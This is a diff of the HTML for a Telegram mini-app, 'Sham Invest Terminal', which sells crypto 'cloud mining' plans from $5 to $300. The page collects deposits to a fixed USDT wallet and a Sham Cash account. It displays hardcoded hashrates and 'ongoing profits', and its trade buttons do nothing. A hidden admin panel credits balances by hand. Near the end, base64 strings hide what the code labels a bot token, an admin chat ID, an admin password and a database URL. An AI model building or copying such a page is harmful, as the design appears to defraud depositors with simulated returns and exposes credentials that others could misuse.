@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Sham Invest Pro Terminal</title>
+  <title>Sham Invest Terminal</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <!-- Tailwind CSS & Lucide Icons -->
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/lucide@latest"></script>
   <script>
@@ -14,10 +13,11 @@
       theme: {
         extend: {
           colors: {
-            brand: '#3b82f6',
-            cardDark: '#0f172a',
-            bgDark: '#020617',
-            accentGreen: '#10b981'
+            cryptoDark: '#080b11',
+            panelDark: '#111722',
+            borderDark: '#1e293b',
+            tradeGreen: '#0ecb81',
+            tradeRed: '#f6465d'
           }
         }
       }
@@ -29,288 +29,281 @@
     .tab-content.active { display: block; }
   </style>
 </head>
-<body class="bg-bgDark text-slate-100 min-h-screen pb-24 font-sans antialiased">
+<body class="bg-cryptoDark text-slate-200 min-h-screen pb-24 font-sans select-none">
 
-  <!-- Header & User Info -->
-  <header class="bg-cardDark/80 backdrop-blur-md border-b border-slate-800 sticky top-0 z-40 px-4 py-3 flex items-center justify-between">
-    <div class="flex items-center gap-3">
-      <div id="userAvatar" class="w-10 h-10 rounded-2xl bg-gradient-to-tr from-blue-600 to-indigo-500 flex items-center justify-center font-bold text-white shadow-lg shadow-blue-500/20">
-        U
-      </div>
+  <!-- Top Institutional Bar -->
+  <header class="bg-panelDark border-b border-borderDark px-4 py-2.5 flex items-center justify-between sticky top-0 z-30 shadow-md">
+    <div class="flex items-center gap-2.5">
+      <div class="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center font-bold text-white shadow-md shadow-blue-500/20" id="userAvatar">U</div>
       <div>
-        <h2 id="userNameDisplay" class="text-sm font-bold text-white">المستخدم</h2>
-        <p id="userIdDisplay" class="text-[11px] text-slate-400">ID: جاري التحميل...</p>
+        <div class="text-xs font-bold text-white flex items-center gap-1.5">
+          <span id="userNameDisplay">المستخدم</span>
+          <span class="w-2 h-2 rounded-full bg-tradeGreen animate-pulse"></span>
+        </div>
+        <div class="text-[10px] text-slate-400 font-mono" id="userIdDisplay">ID: ---</div>
       </div>
     </div>
-    <span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
-      <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
-      سيرفر متصل
-    </span>
+    <div class="text-left font-mono">
+      <span class="text-[10px] text-slate-400 block">إجمالي الرصيد</span>
+      <span class="text-sm font-bold text-tradeGreen">$<span id="balUSDT">0.00</span></span>
+    </div>
   </header>
 
-  <main class="max-w-md mx-auto px-4 mt-4 space-y-4">
+  <!-- Market Info Ribbon -->
+  <div class="bg-cryptoDark border-b border-borderDark px-4 py-2 flex items-center justify-between text-[11px] font-mono">
+    <div class="flex items-center gap-2">
+      <span class="text-white font-bold">BTC/USDT</span>
+      <span class="text-[10px] bg-slate-800 text-slate-300 px-1.5 py-0.5 rounded">Spot</span>
+    </div>
+    <div class="flex gap-4">
+      <div><span class="text-slate-500 text-[9px] block">رصيد شام كاش</span><span class="text-sky-400 font-bold" id="balSYP">0</span> ل.س</div>
+      <div><span class="text-slate-500 text-[9px] block">الباقة النشطة</span><span class="text-amber-400 font-bold" id="activePlanText">بدون باقة</span></div>
+    </div>
+  </div>
 
-    <!-- شارت التداول المباشر TradingView -->
-    <div class="bg-cardDark border border-slate-800 rounded-2xl p-2.5 shadow-xl">
-      <div class="flex items-center justify-between px-2 pb-2 border-b border-slate-800/60 mb-2">
-        <span class="text-xs font-semibold text-slate-300 flex items-center gap-1.5">
-          <i data-lucide="line-chart" class="w-4 h-4 text-blue-400"></i> حركة سوق BTC/USDT الحية
-        </span>
-        <span class="text-[10px] text-slate-500">مباشر • Binance</span>
-      </div>
-      <div class="h-44 w-full rounded-xl overflow-hidden bg-slate-950">
-        <div class="tradingview-widget-container" style="height:100%;width:100%">
-          <div class="tradingview-widget-container__widget" style="height:100%;width:100%"></div>
-          <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js" async>
-          {
+  <!-- Real Interactive Candlestick Chart (TradingView Advanced) -->
+  <div class="w-full bg-panelDark border-b border-borderDark">
+    <div class="h-64 w-full">
+      <div class="tradingview-widget-container" style="height:100%;width:100%">
+        <div id="tradingview_full" style="height:100%;width:100%"></div>
+        <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+        <script type="text/javascript">
+          new TradingView.widget({
+            "autosize": true,
             "symbol": "BINANCE:BTCUSDT",
-            "width": "100%",
-            "height": "100%",
+            "interval": "15",
+            "timezone": "Etc/UTC",
+            "theme": "dark",
+            "style": "1",
             "locale": "ar_AE",
-            "dateRange": "1D",
-            "colorTheme": "dark",
-            "isTransparent": true,
-            "autosize": true
-          }
-          </script>
-        </div>
+            "enable_publishing": false,
+            "hide_top_toolbar": false,
+            "hide_legend": true,
+            "save_image": false,
+            "container_id": "tradingview_full"
+          });
+        </script>
       </div>
     </div>
+  </div>
 
-    <!-- شبكة بطاقات الأرصدة -->
-    <div class="grid grid-cols-2 gap-3">
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-3.5 shadow-lg">
-        <div class="flex items-center justify-between mb-1">
-          <span class="text-[11px] text-slate-400">رصيد USDT</span>
-          <i data-lucide="badge-dollar-sign" class="w-4 h-4 text-emerald-400"></i>
-        </div>
-        <div class="text-lg font-bold text-emerald-400"><span id="balUSDT">0.00</span> <small class="text-xs text-slate-400">USDT</small></div>
-      </div>
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-3.5 shadow-lg">
-        <div class="flex items-center justify-between mb-1">
-          <span class="text-[11px] text-slate-400">رصيد شام كاش</span>
-          <i data-lucide="wallet" class="w-4 h-4 text-blue-400"></i>
-        </div>
-        <div class="text-lg font-bold text-sky-400"><span id="balSYP">0</span> <small class="text-xs text-slate-400">ل.س</small></div>
-      </div>
-    </div>
+  <main class="max-w-md mx-auto px-3 mt-3 space-y-3">
 
-    <!-- شريط التنقل بين التبويبات -->
-    <div class="flex bg-slate-900 border border-slate-800 rounded-2xl p-1 gap-1">
-      <button class="nav-tab active flex-1 py-2 text-xs rounded-xl flex items-center justify-center gap-1.5 text-blue-400 bg-slate-800 font-bold transition" onclick="switchTab('depositTab', this)">
-        <i data-lucide="arrow-down-left" class="w-3.5 h-3.5"></i> إيداع
+    <!-- Switch Screens Tabs (Terminal Navigation) -->
+    <div class="grid grid-cols-4 gap-1 bg-panelDark p-1 rounded-xl border border-borderDark text-xs font-semibold">
+      <button class="nav-tab active py-2 rounded-lg bg-blue-600 text-white flex items-center justify-center gap-1 transition" onclick="switchView('tabTrade', this)">
+        <i data-lucide="activity" class="w-3.5 h-3.5"></i> التداول
       </button>
-      <button class="nav-tab flex-1 py-2 text-xs rounded-xl flex items-center justify-center gap-1.5 text-slate-400 hover:text-white transition" onclick="switchTab('miningTab', this)">
-        <i data-lucide="cpu" class="w-3.5 h-3.5"></i> تعدين
-      </button>
-      <button class="nav-tab flex-1 py-2 text-xs rounded-xl flex items-center justify-center gap-1.5 text-slate-400 hover:text-white transition" onclick="switchTab('plansTab', this)">
+      <button class="nav-tab py-2 rounded-lg text-slate-400 hover:text-white flex items-center justify-center gap-1 transition" onclick="switchView('tabPlans', this)">
         <i data-lucide="layers" class="w-3.5 h-3.5"></i> الباقات
       </button>
-      <button class="nav-tab flex-1 py-2 text-xs rounded-xl flex items-center justify-center gap-1.5 text-slate-400 hover:text-white transition" onclick="switchTab('withdrawTab', this)">
-        <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i> سحب
+      <button class="nav-tab py-2 rounded-lg text-slate-400 hover:text-white flex items-center justify-center gap-1 transition" onclick="switchView('tabDeposit', this)">
+        <i data-lucide="wallet" class="w-3.5 h-3.5"></i> الإيداع
+      </button>
+      <button class="nav-tab py-2 rounded-lg text-slate-400 hover:text-white flex items-center justify-center gap-1 transition" onclick="switchView('tabWithdraw', this)">
+        <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i> السحب
       </button>
     </div>
 
-    <!-- 1. تبويب الإيداع -->
-    <div id="depositTab" class="tab-content active space-y-4">
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-4 space-y-3">
-        <div>
-          <label class="block text-xs text-slate-400 mb-1">طريقة الشحن المتاحة:</label>
-          <select id="payMethod" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 text-xs text-white outline-none focus:border-blue-500" onchange="updatePayInfo()">
-            <option value="usdt">USDT - BEP20 (شبكة BNB Smart Chain)</option>
-            <option value="sham">شام كاش (Sham Cash - ليرة سورية)</option>
-          </select>
-        </div>
-
-        <div id="usdtSection" class="p-3 bg-slate-950/60 rounded-xl border border-slate-800 space-y-2">
-          <span class="text-[11px] text-amber-400 block font-medium">عنوان محفظة الإيداع (BEP20):</span>
-          <div class="bg-slate-900 px-3 py-2 rounded-lg text-xs font-mono text-sky-400 break-all select-all text-center border border-slate-800/80" id="walletAddress">0xd574b014ea536731b17030375b840cb132caa319</div>
-          <button class="w-full py-2 bg-blue-600/20 text-blue-400 hover:bg-blue-600/30 border border-blue-500/30 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition" onclick="copyVal('0xd574b014ea536731b17030375b840cb132caa319')">
-            <i data-lucide="copy" class="w-3.5 h-3.5"></i> نسخ العنوان
+    <!-- 1. شاشة منصة التداول وتنفيذ الأوامر (Trade Tab) -->
+    <div id="tabTrade" class="tab-content active space-y-3">
+      <!-- Order Execution Panel -->
+      <div class="bg-panelDark border border-borderDark rounded-xl p-3 space-y-3">
+        <div class="flex gap-2">
+          <button class="flex-1 py-2 bg-tradeGreen hover:opacity-90 text-slate-950 font-bold rounded-lg text-xs flex items-center justify-center gap-1">
+            <i data-lucide="trending-up" class="w-4 h-4"></i> شراء / Long
+          </button>
+          <button class="flex-1 py-2 bg-tradeRed hover:opacity-90 text-white font-bold rounded-lg text-xs flex items-center justify-center gap-1">
+            <i data-lucide="trending-down" class="w-4 h-4"></i> بيع / Short
           </button>
         </div>
 
-        <div id="shamSection" class="hidden p-3 bg-slate-950/60 rounded-xl border border-slate-800 space-y-2">
-          <span class="text-[11px] text-sky-400 block font-medium">حساب شام كاش المعتمد:</span>
-          <div class="bg-slate-900 px-3 py-2 rounded-lg text-xs font-mono text-sky-400 break-all select-all text-center border border-slate-800/80" id="shamAddress">1e54ae35b9cc8c0a1c7bf10a3c558fc0</div>
-          <button class="w-full py-2 bg-sky-600/20 text-sky-400 hover:bg-sky-600/30 border border-sky-500/30 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition" onclick="copyVal('1e54ae35b9cc8c0a1c7bf10a3c558fc0')">
+        <div class="grid grid-cols-2 gap-2 text-xs">
+          <div class="bg-cryptoDark p-2.5 rounded-lg border border-borderDark">
+            <span class="text-slate-400 block text-[10px] mb-1">اللوت / الكمية</span>
+            <input type="number" placeholder="0.10" class="w-full bg-transparent text-white font-mono outline-none font-bold">
+          </div>
+          <div class="bg-cryptoDark p-2.5 rounded-lg border border-borderDark">
+            <span class="text-slate-400 block text-[10px] mb-1">الرافعة المالية</span>
+            <select class="w-full bg-transparent text-tradeGreen font-mono outline-none font-bold">
+              <option>1:50</option>
+              <option>1:100</option>
+              <option>1:200</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Live Mining Node Info -->
+        <div class="p-3 bg-cryptoDark rounded-lg border border-borderDark flex items-center justify-between">
+          <div class="flex items-center gap-2">
+            <i data-lucide="cpu" class="w-5 h-5 text-tradeGreen animate-pulse"></i>
+            <div>
+              <div class="text-xs font-bold text-white">خادم التعدين السحابي</div>
+              <div class="text-[10px] text-slate-400">182.40 GH/s • كفاءة 99.9%</div>
+            </div>
+          </div>
+          <span class="text-[10px] bg-emerald-500/10 text-tradeGreen border border-emerald-500/20 px-2 py-0.5 rounded-md">أرباح جارية</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- 2. شاشة الباقات (Plans Tab) -->
+    <div id="tabPlans" class="tab-content space-y-2">
+      <div class="bg-panelDark border border-borderDark rounded-xl p-3 flex items-center justify-between">
+        <div>
+          <div class="text-xs font-bold text-white">Bronze Rig</div>
+          <div class="text-[10px] text-slate-400">180 GH/s • ربح تلقائي</div>
+        </div>
+        <button onclick="buyPlan('Bronze Rig', 5)" class="px-4 py-1.5 bg-tradeGreen text-slate-950 font-bold text-xs rounded-lg shadow">$5 تفعيل</button>
+      </div>
+
+      <div class="bg-panelDark border border-borderDark rounded-xl p-3 flex items-center justify-between">
+        <div>
+          <div class="text-xs font-bold text-white">Silver Rig</div>
+          <div class="text-[10px] text-slate-400">300 GH/s • عائد مضاعف</div>
+        </div>
+        <button onclick="buyPlan('Silver Rig', 15)" class="px-4 py-1.5 bg-blue-600 text-white font-bold text-xs rounded-lg shadow">$15 تفعيل</button>
+      </div>
+
+      <div class="bg-panelDark border border-borderDark rounded-xl p-3 flex items-center justify-between">
+        <div>
+          <div class="text-xs font-bold text-white">Gold Rig</div>
+          <div class="text-[10px] text-slate-400">480 GH/s • عائد تعدين فائق</div>
+        </div>
+        <button onclick="buyPlan('Gold Rig', 50)" class="px-4 py-1.5 bg-amber-500 text-slate-950 font-bold text-xs rounded-lg shadow">$50 تفعيل</button>
+      </div>
+
+      <div class="bg-panelDark border border-borderDark rounded-xl p-3 flex items-center justify-between">
+        <div>
+          <div class="text-xs font-bold text-white">Platinum Rig</div>
+          <div class="text-[10px] text-slate-400">1200 GH/s • باقة المستثمرين</div>
+        </div>
+        <button onclick="buyPlan('Platinum Rig', 100)" class="px-4 py-1.5 bg-purple-600 text-white font-bold text-xs rounded-lg shadow">$100 تفعيل</button>
+      </div>
+
+      <div class="bg-panelDark border border-borderDark rounded-xl p-3 flex items-center justify-between">
+        <div>
+          <div class="text-xs font-bold text-white">VIP Elite Rig</div>
+          <div class="text-[10px] text-slate-400">3600 GH/s • أقصى كفاءة</div>
+        </div>
+        <button onclick="buyPlan('VIP Elite Rig', 300)" class="px-4 py-1.5 bg-rose-600 text-white font-bold text-xs rounded-lg shadow">$300 تفعيل</button>
+      </div>
+    </div>
+
+    <!-- 3. شاشة الإيداع (Deposit Tab) -->
+    <div id="tabDeposit" class="tab-content space-y-3">
+      <div class="bg-panelDark border border-borderDark rounded-xl p-4 space-y-3">
+        <div>
+          <label class="block text-xs text-slate-400 mb-1">الشبكة أو طريقة الدفع:</label>
+          <select id="payMethod" class="w-full bg-cryptoDark border border-borderDark rounded-lg p-2.5 text-xs text-white outline-none" onchange="updatePayInfo()">
+            <option value="usdt">USDT - BEP20 (Binance Smart Chain)</option>
+            <option value="sham">شام كاش (Sham Cash)</option>
+          </select>
+        </div>
+
+        <div id="usdtSection" class="p-3 bg-cryptoDark rounded-lg border border-borderDark space-y-2">
+          <span class="text-[10px] text-amber-400 block font-mono">عنوان الإيداع (BEP20):</span>
+          <div class="bg-panelDark p-2 rounded text-[11px] font-mono text-sky-400 break-all select-all text-center">0xd574b014ea536731b17030375b840cb132caa319</div>
+          <button class="w-full py-1.5 bg-blue-600/20 text-blue-400 border border-blue-500/30 rounded text-xs font-semibold flex items-center justify-center gap-1" onclick="copyVal('0xd574b014ea536731b17030375b840cb132caa319')">
+            <i data-lucide="copy" class="w-3.5 h-3.5"></i> نسخ المحفظة
+          </button>
+        </div>
+
+        <div id="shamSection" class="hidden p-3 bg-cryptoDark rounded-lg border border-borderDark space-y-2">
+          <span class="text-[10px] text-sky-400 block font-mono">رقم حساب شام كاش:</span>
+          <div class="bg-panelDark p-2 rounded text-[11px] font-mono text-sky-400 break-all select-all text-center">1e54ae35b9cc8c0a1c7bf10a3c558fc0</div>
+          <button class="w-full py-1.5 bg-sky-600/20 text-sky-400 border border-sky-500/30 rounded text-xs font-semibold flex items-center justify-center gap-1" onclick="copyVal('1e54ae35b9cc8c0a1c7bf10a3c558fc0')">
             <i data-lucide="copy" class="w-3.5 h-3.5"></i> نسخ الحساب
           </button>
         </div>
 
         <div>
-          <label class="block text-xs text-slate-400 mb-1">المبلغ المراد شحنه:</label>
-          <input type="number" id="inAmount" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 text-xs text-white outline-none focus:border-blue-500" placeholder="مثال: 50">
+          <label class="block text-xs text-slate-400 mb-1">المبلغ المطلوب شحنه:</label>
+          <input type="number" id="inAmount" class="w-full bg-cryptoDark border border-borderDark rounded-lg p-2.5 text-xs text-white outline-none" placeholder="50">
         </div>
-
         <div>
-          <label class="block text-xs text-slate-400 mb-1">رمز العملية / TXID:</label>
-          <input type="text" id="inTxid" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 text-xs text-white outline-none focus:border-blue-500" placeholder="أدخل رمز التحويل هنا">
+          <label class="block text-xs text-slate-400 mb-1">TXID / رمز المعاملة:</label>
+          <input type="text" id="inTxid" class="w-full bg-cryptoDark border border-borderDark rounded-lg p-2.5 text-xs text-white outline-none" placeholder="Hash">
         </div>
 
-        <button onclick="submitDeposit()" class="w-full py-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white rounded-xl text-xs font-bold shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2 transition active:scale-[0.98]">
-          <i data-lucide="send" class="w-4 h-4"></i> تأكيد الإيداع للإدارة
-        </button>
+        <button onclick="submitDeposit()" class="w-full py-2.5 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-bold shadow-lg transition">تأكيد طلب الشحن</button>
       </div>
     </div>
 
-    <!-- 2. تبويب التعدين السحابي -->
-    <div id="miningTab" class="tab-content space-y-4">
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-4 text-center space-y-3">
-        <div class="w-14 h-14 mx-auto rounded-2xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
-          <i data-lucide="server" class="w-7 h-7 animate-pulse"></i>
-        </div>
-        <h3 class="text-sm font-bold text-white">Antminer S19 Pro Institutional</h3>
-        <p class="text-[11px] text-slate-400">تعدين سحابي نشط 24/7 مع أرباح آلية</p>
-
-        <div class="bg-slate-950 p-3 rounded-xl border border-slate-800 text-right space-y-2">
-          <div class="flex justify-between text-xs">
-            <span class="text-slate-400">قوة الهاش الحالية:</span>
-            <span class="text-emerald-400 font-bold font-mono">182.40 GH/s</span>
-          </div>
-          <div class="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
-            <div class="bg-gradient-to-r from-blue-500 to-emerald-400 h-full w-[68%]"></div>
-          </div>
-        </div>
-
-        <div class="grid grid-cols-2 gap-2 text-xs">
-          <div class="bg-slate-950 p-2.5 rounded-xl border border-slate-800">
-            <span class="text-slate-500 block text-[10px]">حرارة المعالج</span>
-            <span class="text-amber-400 font-bold">54°C</span>
-          </div>
-          <div class="bg-slate-950 p-2.5 rounded-xl border border-slate-800">
-            <span class="text-slate-500 block text-[10px]">كفاءة السيرفر</span>
-            <span class="text-emerald-400 font-bold">99.9%</span>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- 3. تبويب الباقات الخمس -->
-    <div id="plansTab" class="tab-content space-y-3">
-      <div id="activePlansSummary" class="text-xs text-sky-400 font-bold bg-slate-900 border border-slate-800 p-3 rounded-xl">
-        الباقة المفعّلة: لا توجد باقة نشطة حالياً
-      </div>
-
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-3.5 flex items-center justify-between">
+    <!-- 4. شاشة السحب (Withdraw Tab) -->
+    <div id="tabWithdraw" class="tab-content space-y-3">
+      <div class="bg-panelDark border border-borderDark rounded-xl p-4 space-y-3">
         <div>
-          <h4 class="text-xs font-bold text-white">Bronze Rig (الباقة الأولى)</h4>
-          <p class="text-[10px] text-slate-400">180 GH/s • ربح دوري تلقائي</p>
-        </div>
-        <button onclick="buyPlan('Bronze Rig', 5)" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs rounded-xl shadow-md transition">5$ تفعيل</button>
-      </div>
-
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-3.5 flex items-center justify-between">
-        <div>
-          <h4 class="text-xs font-bold text-white">Silver Rig (الباقة الثانية)</h4>
-          <p class="text-[10px] text-slate-400">300 GH/s • عائد مضاعف</p>
-        </div>
-        <button onclick="buyPlan('Silver Rig', 15)" class="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs rounded-xl shadow-md transition">15$ ترقية</button>
-      </div>
-
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-3.5 flex items-center justify-between">
-        <div>
-          <h4 class="text-xs font-bold text-white">Gold Rig (الباقة الذهبية)</h4>
-          <p class="text-[10px] text-slate-400">480 GH/s • عائد تعدين فائق</p>
-        </div>
-        <button onclick="buyPlan('Gold Rig', 50)" class="px-4 py-2 bg-amber-600 hover:bg-amber-500 text-white font-bold text-xs rounded-xl shadow-md transition">50$ ترقية</button>
-      </div>
-
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-3.5 flex items-center justify-between">
-        <div>
-          <h4 class="text-xs font-bold text-white">Platinum Rig (الماسية)</h4>
-          <p class="text-[10px] text-slate-400">1200 GH/s • تعدين سحابي مكثف</p>
-        </div>
-        <button onclick="buyPlan('Platinum Rig', 100)" class="px-4 py-2 bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs rounded-xl shadow-md transition">100$ ترقية</button>
-      </div>
-
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-3.5 flex items-center justify-between">
-        <div>
-          <h4 class="text-xs font-bold text-white">VIP Elite Rig</h4>
-          <p class="text-[10px] text-slate-400">3600 GH/s • أقصى كفاءة للمستثمرين</p>
-        </div>
-        <button onclick="buyPlan('VIP Elite Rig', 300)" class="px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white font-bold text-xs rounded-xl shadow-md transition">300$ ترقية</button>
-      </div>
-    </div>
-
-    <!-- 4. تبويب السحب -->
-    <div id="withdrawTab" class="tab-content space-y-4">
-      <div class="bg-cardDark border border-slate-800 rounded-2xl p-4 space-y-3">
-        <div>
-          <label class="block text-xs text-slate-400 mb-1">نوع السحب:</label>
-          <select id="withdrawType" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 text-xs text-white outline-none">
+          <label class="block text-xs text-slate-400 mb-1">طريقة السحب:</label>
+          <select id="withdrawType" class="w-full bg-cryptoDark border border-borderDark rounded-lg p-2.5 text-xs text-white outline-none">
             <option value="usdt">USDT - BEP20</option>
             <option value="sham">شام كاش (Sham Cash)</option>
           </select>
         </div>
         <div>
-          <label class="block text-xs text-slate-400 mb-1">مبلغ السحب (الحد الأدنى 10$):</label>
-          <input type="number" id="outAmount" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 text-xs text-white outline-none" placeholder="10">
+          <label class="block text-xs text-slate-400 mb-1">المبلغ (الحد الأدنى 10$):</label>
+          <input type="number" id="outAmount" class="w-full bg-cryptoDark border border-borderDark rounded-lg p-2.5 text-xs text-white outline-none" placeholder="10">
         </div>
         <div>
-          <label class="block text-xs text-slate-400 mb-1">عنوان المحفظة أو رقم الحساب:</label>
-          <input type="text" id="outAddress" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 text-xs text-white outline-none" placeholder="العنوان المستلم">
+          <label class="block text-xs text-slate-400 mb-1">عنوان المحفظة المستلمة:</label>
+          <input type="text" id="outAddress" class="w-full bg-cryptoDark border border-borderDark rounded-lg p-2.5 text-xs text-white outline-none" placeholder="Address">
         </div>
-        <button onclick="submitWithdraw()" class="w-full py-3 bg-amber-500 hover:bg-amber-400 text-slate-950 rounded-xl text-xs font-bold shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2 transition active:scale-[0.98]">
-          <i data-lucide="paper-plane" class="w-4 h-4"></i> إرسال طلب السحب للإدارة
-        </button>
+        <button onclick="submitWithdraw()" class="w-full py-2.5 bg-tradeGreen hover:opacity-90 text-slate-950 rounded-lg text-xs font-bold shadow-lg transition">إرسال طلب السحب</button>
       </div>
     </div>
 
-    <!-- زر بوابة المشرف السري -->
-    <div class="pt-4 text-center">
-      <button onclick="openAdminModal()" class="text-[11px] text-slate-600 hover:text-slate-400 inline-flex items-center gap-1 transition">
-        <i data-lucide="lock" class="w-3.5 h-3.5"></i> بوابة الإدارة
+    <!-- بوابـة المشرف -->
+    <div class="pt-2 text-center">
+      <button onclick="openAdminModal()" class="text-[10px] text-slate-600 hover:text-slate-400 flex items-center justify-center gap-1 mx-auto">
+        <i data-lucide="shield-alert" class="w-3 h-3"></i> لوحة الإدارة
       </button>
     </div>
 
   </main>
 
   <!-- نافذة المشرف المنبثقة -->
-  <div id="adminModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
-    <div class="bg-cardDark border border-slate-800 rounded-2xl p-5 w-full max-w-sm space-y-4 shadow-2xl">
-      <div class="flex items-center justify-between border-b border-slate-800 pb-2">
-        <h3 class="text-xs font-bold text-sky-400 flex items-center gap-1.5"><i data-lucide="shield" class="w-4 h-4"></i> لوحة التحكم</h3>
+  <div id="adminModal" class="fixed inset-0 bg-black/85 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
+    <div class="bg-panelDark border border-borderDark rounded-xl p-4 w-full max-w-xs space-y-3 shadow-2xl">
+      <div class="flex items-center justify-between border-b border-borderDark pb-2">
+        <span class="text-xs font-bold text-sky-400">لوحة تحكم السيرفر</span>
         <button onclick="closeAdminModal()" class="text-slate-400 hover:text-white"><i data-lucide="x" class="w-4 h-4"></i></button>
       </div>
       <div>
-        <label class="block text-[11px] text-slate-400 mb-1">كلمة مرور المشرف:</label>
-        <input type="password" id="adminPassInput" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2 text-xs text-white outline-none">
+        <label class="block text-[10px] text-slate-400 mb-1">كلمة المرور:</label>
+        <input type="password" id="adminPassInput" class="w-full bg-cryptoDark border border-borderDark rounded p-1.5 text-xs text-white outline-none">
       </div>
       <div>
-        <label class="block text-[11px] text-slate-400 mb-1">معرف المستخدم (Telegram ID):</label>
-        <input type="text" id="adminTargetId" class="w-full bg-slate-900 border border-slate-800 rounded-xl p-2 text-xs text-white outline-none">
+        <label class="block text-[10px] text-slate-400 mb-1">معرف المستخدم (Telegram ID):</label>
+        <input type="text" id="adminTargetId" class="w-full bg-cryptoDark border border-borderDark rounded p-1.5 text-xs text-white outline-none">
       </div>
-      <div class="p-3 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
-        <span class="text-[11px] text-emerald-400 block font-semibold">شحن رصيد للمستخدم:</span>
-        <input type="number" id="adminAmountInput" placeholder="المبلغ بالدولار" class="w-full bg-slate-900 border border-slate-800 rounded-lg p-2 text-xs text-white outline-none">
-        <button onclick="executeAdminRecharge()" class="w-full py-2 bg-emerald-600 text-white rounded-lg text-xs font-bold">تأكيد الشحن</button>
+      <div class="p-2.5 bg-cryptoDark rounded border border-borderDark space-y-2">
+        <span class="text-[10px] text-tradeGreen block font-bold">شحن الرصيد:</span>
+        <input type="number" id="adminAmountInput" placeholder="المبلغ بالدولار" class="w-full bg-panelDark border border-borderDark rounded p-1 text-xs text-white outline-none">
+        <button onclick="executeAdminRecharge()" class="w-full py-1.5 bg-tradeGreen text-slate-950 font-bold rounded text-xs">شحن الرصيد</button>
       </div>
-      <div class="p-3 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
-        <span class="text-[11px] text-amber-400 block font-semibold">تفعيل باقة:</span>
-        <select id="adminPlanSelect" class="w-full bg-slate-900 border border-slate-800 rounded-lg p-2 text-xs text-white outline-none">
+      <div class="p-2.5 bg-cryptoDark rounded border border-borderDark space-y-2">
+        <span class="text-[10px] text-amber-400 block font-bold">تفعيل باقة:</span>
+        <select id="adminPlanSelect" class="w-full bg-panelDark border border-borderDark rounded p-1 text-xs text-white outline-none">
           <option value="Bronze Rig">Bronze Rig (5$)</option>
           <option value="Silver Rig">Silver Rig (15$)</option>
           <option value="Gold Rig">Gold Rig (50$)</option>
           <option value="Platinum Rig">Platinum Rig (100$)</option>
           <option value="VIP Elite Rig">VIP Elite Rig (300$)</option>
         </select>
-        <button onclick="executeAdminActivatePlan()" class="w-full py-2 bg-amber-600 text-white rounded-lg text-xs font-bold">تفعيل الباقة فوراً</button>
+        <button onclick="executeAdminActivatePlan()" class="w-full py-1.5 bg-amber-500 text-slate-950 font-bold rounded text-xs">تفعيل فوري</button>
       </div>
     </div>
   </div>
 
-  <!-- Toast Notification -->
-  <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-emerald-500 text-white text-xs px-4 py-2 rounded-full shadow-2xl hidden z-50"></div>
+  <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-blue-600 text-white text-xs px-4 py-2 rounded-full shadow-2xl hidden z-50"></div>
 
-  <!-- سكربت الحماية والتشغيل المشفر -->
+  <!-- سكربت التحكم والتشفير -->
   <script>
-    // تشفير السلاسل الحساسة داخل الكود لحمايتها من الفحص المباشر
-    const _0x4f1 = (s) => atob(s);
-    const _k1 = _0x4f1("ODc3ODAwNzQ1MDpBQUdIdmY4Tmo3ZHVMeXpKX2VLR0tFaFNRelAyNV9XN1RIVQ=="); // بوت توكن مشفر
-    const _k2 = _0x4f1("NTM3MDY0NDgzOQ=="); // شات آيدي الإدارة مشفر
-    const _k3 = _0x4f1("MDY2NjM5MDkwNA=="); // كلمة مرور المشرف مشفرة
-    const _db = _0x4f1("aHR0cHM6Ly9zaGFtLXByby1pbnZlc3QtZGVmYXVsdC1ydGRiLmZpcmViYXNlaW8uY29tL3VzZXJz");
